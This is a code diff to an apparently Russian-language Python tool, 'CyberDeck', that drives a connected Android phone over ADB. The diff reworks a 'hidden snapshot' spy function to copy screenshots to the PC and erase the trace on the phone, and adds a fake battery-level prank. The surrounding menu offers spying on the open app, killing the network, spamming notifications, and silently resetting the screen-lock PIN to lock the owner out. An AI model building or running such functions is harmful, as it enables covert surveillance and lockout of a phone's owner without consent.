@@ -4,6 +4,14 @@ import sys
 import time
 import random
 
+# --- 📁 ПАПКИ В КОРНЕ ---
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SCREENSHOTS_DIR = os.path.join(BASE_DIR, "screenshots")
+
+def ensure_dirs():
+    if not os.path.exists(SCREENSHOTS_DIR):
+        os.makedirs(SCREENSHOTS_DIR)
+
 # --- ЦВЕТА ---
 class C:
     H = '\033[95m'
@@ -48,12 +56,14 @@ def active_app():
 
 def silent_photo():
     print(f"\n{C.CY}[*] Делаю скрытый снимок (через камеру или скриншот)...{C.E}")
-    # Пытаемся нажать кнопку спуска затвора (работает если открыта камера)
     adb("shell input keyevent 27")
     time.sleep(2)
-    # Если не вышло, делаем скриншот как запасной вариант
-    adb("shell screencap -p /sdcard/Download/CyberDeck/screenshots/spy_shot.png")
-    print(f"{C.G}[+] Снимок сохранен в папку screenshots!{C.E}")
+    # 🔧 Сохраняем сразу на ПК/локально в screenshots/
+    local_path = os.path.join(SCREENSHOTS_DIR, "spy_shot.png")
+    adb("shell screencap -p /sdcard/tmp_spy.png")
+    adb(f"pull /sdcard/tmp_spy.png \"{local_path}\"")
+    adb("shell rm /sdcard/tmp_spy.png")
+    print(f"{C.G}[+] Снимок сохранен: {local_path}{C.E}")
     pause()
 
 # ==========================================
@@ -123,6 +133,28 @@ def network_killer():
     print(f"{C.G}[+] Сеть отключена.{C.E}")
     pause()
 
+def fake_battery():
+    print(f"\n{C.F}{C.BOLD}[!] ФЕЙК ПРОЦЕНТОВ БАТАРЕИ{C.E}")
+    try:
+        percent = int(input(f"{C.W}Введи фейковый процент (0-100): {C.E}"))
+        if not (0 <= percent <= 100):
+            print(f"{C.F}[!] Нужно число от 0 до 100.{C.E}")
+            pause()
+            return
+        adb("shell dumpsys battery unplug")
+        adb(f"shell dumpsys battery set level {percent}")
+        print(f"{C.G}[+] Телефон теперь показывает {C.BOLD}{percent}%{C.E}")
+        print(f"{C.W}[i] Реальный заряд не меняется, только отображение.{C.E}")
+    except ValueError:
+        print(f"{C.F}[!] Ошибка ввода. Нужно число.{C.E}")
+    pause()
+
+def reset_battery():
+    print(f"\n{C.CY}[*] Сбрасываю фейковый процент...{C.E}")
+    adb("shell dumpsys battery reset")
+    print(f"{C.G}[+] Батарея вернулась к реальным значениям.{C.E}")
+    pause()
+
 # ==========================================
 # ⚙️ НАСТРОЙКИ И УТИЛИТЫ
 # ==========================================
@@ -167,7 +199,7 @@ def change_pin():
     if len(new_pin) == 4 and new_pin.isdigit():
         adb(f"shell locksettings set-pin {new_pin}")
         print(f"{C.F}[!] PIN изменен на {new_pin}. Экран заблокирован!{C.E}")
-        adb("shell input keyevent 26") # Гасим экран
+        adb("shell input keyevent 26")
     else:
         print(f"{C.F}[!] Ошибка. Нужно 4 цифры.{C.E}")
     pause()
@@ -183,6 +215,7 @@ def kernel_panic():
 # ==========================================
 
 def main():
+    ensure_dirs()  # 🔧 создаём screenshots/ при запуске
     if not check_connection():
         print(f"{C.F}[!] Ошибка: Телефон не подключен!{C.E}")
         sys.exit()
@@ -190,11 +223,11 @@ def main():
     while True:
         clear()
         print(f"{C.CY}{C.BOLD}=== CYBERDECK: ALL-IN-ONE TOOLS ==={C.E}")
-        
+
         print(f"\n{C.B}--- 🕵️ ШПИОНАЖ ---{C.E}")
         print("1. Какое приложение открыто?")
         print("2. Скрытый снимок")
-        
+
         print(f"\n{C.W}--- 😈 ПРАНКИ ---{C.E}")
         print("3. Полтергейст (Тыкает экран)")
         print("4. Тикток-Зомби (Скроллит)")
@@ -203,15 +236,17 @@ def main():
         print("7. Рикролл")
         print("8. Спам уведомлениями")
         print("9. Отключить интернет (Kill Net)")
-        
+        print("10. Фейк процентов батареи")
+        print("11. Сбросить фейк процентов")
+
         print(f"\n{C.CY}--- ⚙️ УТИЛИТЫ ---{C.E}")
-        print("10. Автокликер")
-        print("11. Hacker UI Вкл/Выкл")
-        
+        print("12. Автокликер")
+        print("13. Hacker UI Вкл/Выкл")
+
         print(f"\n{C.F}--- ☠️ ОПАСНАЯ ЗОНА ---{C.E}")
-        print("12. Сменить PIN-код экрана")
-        print("13. Kernel Panic (Выключить)")
-        
+        print("14. Сменить PIN-код экрана")
+        print("15. Kernel Panic (Выключить)")
+
         print(f"\n{C.F}0. Выход{C.E}")
 
         choice = input(f"\n{C.BOLD}Выбор: {C.E}")
@@ -225,10 +260,12 @@ def main():
         elif choice == '7': rickroll()
         elif choice == '8': notification_spam()
         elif choice == '9': network_killer()
-        elif choice == '10': autoclicker()
-        elif choice == '11': hacker_ui(True) # Можно сделать переключатель, но для простоты так
-        elif choice == '12': change_pin()
-        elif choice == '13': kernel_panic()
+        elif choice == '10': fake_battery()
+        elif choice == '11': reset_battery()
+        elif choice == '12': autoclicker()
+        elif choice == '13': hacker_ui(True)
+        elif choice == '14': change_pin()
+        elif choice == '15': kernel_panic()
         elif choice == '0': break
 
 if __name__ == "__main__":
